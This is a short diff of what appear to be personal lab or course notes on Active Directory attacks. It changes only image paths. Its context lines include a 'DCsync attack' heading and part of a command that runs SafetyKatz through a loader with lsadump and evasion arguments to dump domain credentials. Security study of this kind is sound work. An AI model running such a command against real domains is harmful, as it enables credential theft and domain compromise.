@@ -1,6 +1,6 @@
-![[Pasted image 20250621164044.png]]
+![[../../../attchments/Pasted image 20250621164044.png]]
 
-![[Pasted image 20250621164118.png]]
+![[../../../attchments/Pasted image 20250621164118.png]]
 
 # DCsync attack
 
@@ -9,7 +9,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump:: evasive
 "exit"
 ```
 
-![[Pasted image 20250621164200.png]]
+![[../../../attchments/Pasted image 20250621164200.png]]
 
-![[Pasted image 20250621164231.png]]
+![[../../../attchments/Pasted image 20250621164231.png]]
 
